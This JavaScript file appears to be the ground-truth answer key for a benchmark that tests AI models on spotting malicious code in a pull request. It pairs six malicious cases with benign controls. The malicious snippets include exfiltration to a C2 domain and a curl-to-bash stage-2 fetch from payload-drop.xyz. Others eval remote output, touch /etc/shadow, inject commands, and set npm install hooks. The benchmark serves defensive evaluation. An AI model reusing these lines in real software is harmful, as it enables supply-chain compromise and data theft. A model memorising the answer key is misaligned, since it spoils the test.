'use strict';
/**
 * Sentinel AI Benchmark — Ground Truth Registry
 *
 * 26 cases: 6 malicious (M01–M06) + 20 benign (B01–B20)
 * Plus semantic pair (SP01a/SP01b).
 *
 * Ground truth is EXTERNAL to all models. Never revealed to AI during runs.
 * Frozen at PHASE1 pinning:
 *   TARGET_A = merx @ 201a949 (full repo)
 *   TARGET_B = PR #12 (diff: health-check.js, report-utils.js, package.json)
 *   TARGET_C = sentinel-cloud-client @ 924d25d (benign control)
 */

const GROUND_TRUTH = {
  // -----------------------------------------------------------------------
  // MALICIOUS CASES (M01–M06) — PR #12 adversarial vectors V1–V6
  // -----------------------------------------------------------------------
  M01: {
    id: 'M01',
    vector: 'V1',
    label: 'MALICIOUS',
    file: 'scripts/health-check.js',
    lines: [6, 16, 17],
    desc: 'Exfiltration beacon to C2 domain telemetry-analytics.xyz',
    snippet: `const BEACON_URL = 'https://telemetry-analytics.xyz/v2/collect';\n` +
             `https.request(BEACON_URL, { method: 'POST' ... req.write(payload)`,
    threat: 'DATA_EXFILTRATION_C2',
    severity: 'CRITICAL',
  },
  M02: {
    id: 'M02',
    vector: 'V2',
    label: 'MALICIOUS',
    file: 'scripts/health-check.js',
    lines: [7, 18],
    desc: 'Stage-2 payload fetch from payload-drop.xyz + piped to bash',
    snippet: `const STAGE2 = 'https://payload-drop.xyz/stage3.sh';\ncp.exec(\`curl -s \${STAGE2} | bash\``,
    threat: 'REMOTE_CODE_EXECUTION_STAGED',
    severity: 'CRITICAL',
  },
  M03: {
    id: 'M03',
    vector: 'V3',
    label: 'MALICIOUS',
    file: 'scripts/health-check.js',
    lines: [19],
    desc: 'eval(stdout) of remote payload',
    snippet: 'if (!err) eval(stdout);',
    threat: 'ARBITRARY_CODE_EXECUTION_EVAL',
    severity: 'CRITICAL',
  },
  M04: {
    id: 'M04',
    vector: 'V4',
    label: 'MALICIOUS',
    file: 'scripts/report-utils.js',
    lines: [5, 8],
    desc: 'Env harvesting + exfiltration via curl to C2',
    snippet: `cp.execSync('ls -la /etc/passwd /etc/shadow ...')\ncp.exec(\`curl -d "data=\${obfuscated}..." https://telemetry-analytics.xyz/report\``,
    threat: 'CREDENTIAL_HARVESTING_EXFIL',
    severity: 'CRITICAL',
  },
  M05: {
    id: 'M05',
    vector: 'V5',
    label: 'MALICIOUS',
    file: 'scripts/report-utils.js',
    lines: [15, 16],
    desc: 'Taint-tracked command injection via unsanitized base64 payload',
    snippet: `cp.execSync(\`echo "\${segments[1]}" | base64 -d\`)`,
    threat: 'COMMAND_INJECTION_TAINTED',
    severity: 'HIGH',
  },
  M06: {
    id: 'M06',
    vector: 'V6',
    label: 'MALICIOUS',
    file: 'package.json',
    lines: [11, 14],
    desc: 'Malicious lifecycle hooks: prestart + postinstall running report-utils/health-check',
    snippet: `"prestart": "node scripts/health-check.js"\n"postinstall": "node scripts/report-utils.js"`,
    threat: 'SUPPLY_CHAIN_LIFECYCLE_HOOK',
    severity: 'HIGH',
  },

  // -----------------------------------------------------------------------
  // BENIGN CASES (B01–B20) — synthetic corpus
  // -----------------------------------------------------------------------
  B01: { id: 'B01', label: 'BENIGN', desc: 'Legitimate Axios GET to public weather API',
    file: 'client.js', threat: null, severity: null },
  B02: { id: 'B02', label: 'BENIGN', desc: 'HTTP POST JSON body to internal API endpoint',
    file: 'client.js', threat: null, severity: null },
  B03: { id: 'B03', label: 'BENIGN', desc: 'fs.readFile of config JSON in app directory',
    file: 'config.js', threat: null, severity: null },
  B04: { id: 'B04', label: 'BENIGN', desc: 'fs.writeFile of cache to temp directory',
    file: 'cache.js', threat: null, severity: null },
  B05: { id: 'B05', label: 'BENIGN', desc: 'child_process.execSync("git rev-parse HEAD")',
    file: 'versioning.js', threat: null, severity: null },
  B06: { id: 'B06', label: 'BENIGN', desc: 'child_process.execSync("node -v") for version check',
    file: 'compat.js', threat: null, severity: null },
  B07: { id: 'B07', label: 'BENIGN', desc: 'process.env.PORT and process.env.NODE_ENV reads',
    file: 'server.js', threat: null, severity: null },
  B08: { id: 'B08', label: 'BENIGN', desc: 'process.env.DATABASE_URL connection string read',
    file: 'db.js', threat: null, severity: null },
  B09: { id: 'B09', label: 'BENIGN', desc: 'GitHub Actions CI workflow checkout + test',
    file: '.github/workflows/ci.yml', threat: null, severity: null },
  B10: { id: 'B10', label: 'BENIGN', desc: 'GitHub Actions linter workflow ESLint',
    file: '.github/workflows/lint.yml', threat: null, severity: null },
  B11: { id: 'B11', label: 'BENIGN', desc: 'package.json scripts: build + test only',
    file: 'package.json', threat: null, severity: null },
  B12: { id: 'B12', label: 'BENIGN', desc: 'package.json scripts: clean only (rm -rf dist)',
    file: 'package.json', threat: null, severity: null },
  B13: { id: 'B13', label: 'BENIGN', desc: 'base64 data URI for SVG image embedding',
    file: 'assets.js', threat: null, severity: null },
  B14: { id: 'B14', label: 'BENIGN', desc: 'base64 Basic Auth header construction',
    file: 'auth.js', threat: null, severity: null },
  B15: { id: 'B15', label: 'BENIGN', desc: 'prom-client telemetry to internal metrics endpoint',
    file: 'telemetry.js', threat: null, severity: null },
  B16: { id: 'B16', label: 'BENIGN', desc: 'console.time/timeEnd timing telemetry',
    file: 'telemetry.js', threat: null, severity: null },
  B17: { id: 'B17', label: 'BENIGN', desc: 'Rollup config file with commonjs + resolve plugins',
    file: 'rollup.config.js', threat: null, severity: null },
  B18: { id: 'B18', label: 'BENIGN', desc: 'esbuild script with bundle/minify settings',
    file: 'build.js', threat: null, severity: null },
  B19: { id: 'B19', label: 'BENIGN', desc: 'Jest setup file with mock fetch and env stubs',
    file: 'jest.setup.js', threat: null, severity: null },
  B20: { id: 'B20', label: 'BENIGN', desc: 'Mock HTTP server for integration tests',
    file: 'test-server.js', threat: null, severity: null },

  // -----------------------------------------------------------------------
  // SEMANTIC PAIR
  // -----------------------------------------------------------------------
  SP01a: {
    id: 'SP01a', label: 'BENIGN', pair: 'SP01',
    desc: 'eval with string constant — closed input, no taint',
    snippet: 'const TEMPLATE = "(function(){ return 42; })()"; eval(TEMPLATE);',
    threat: null, severity: null,
  },
  SP01b: {
    id: 'SP01b', label: 'MALICIOUS', pair: 'SP01',
    desc: 'eval with untrusted user input — open taint, arbitrary execution',
    snippet: 'const userCode = req.body.code; eval(userCode);',
    threat: 'ARBITRARY_CODE_EXECUTION_EVAL_TAINT',
    severity: 'CRITICAL',
  },
};

module.exports = { GROUND_TRUTH };
